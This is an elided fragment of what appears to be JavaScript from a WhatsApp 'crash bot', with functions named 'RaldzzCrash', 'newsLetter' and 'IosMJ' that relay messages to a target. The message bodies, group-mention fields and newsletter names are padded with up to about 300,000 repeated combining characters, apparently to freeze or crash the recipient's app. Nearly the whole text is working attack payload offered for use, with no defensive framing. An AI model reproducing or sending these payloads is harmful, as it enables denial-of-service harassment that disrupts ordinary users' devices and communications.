        ...
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "♨️ 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 ♨️" + "ꦽ".repeat(280000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
        ...
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "💣 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 💣" + "ꦾ".repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
        ...
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "Please.." + "ꦾ".repeat(90000) + "ꦾ ".repeat(230000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
        ...
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "Wanna With Yours. :D" + "ꦾ".repeat(290000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
...
async function newsLetter(target, Ptcp = true) {
                    ...
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                ...
                                newsletterName: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી" + "ી".repeat(135000),
                                jpegThumbnail: "",
    ...
    async function IosMJ(target, Ptcp = false) {
      await cella.relayMessage(
        ...
        {
          extendedTextMessage: {
            text: "Wanna With Yours :)" + "ꦾ".repeat(140000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
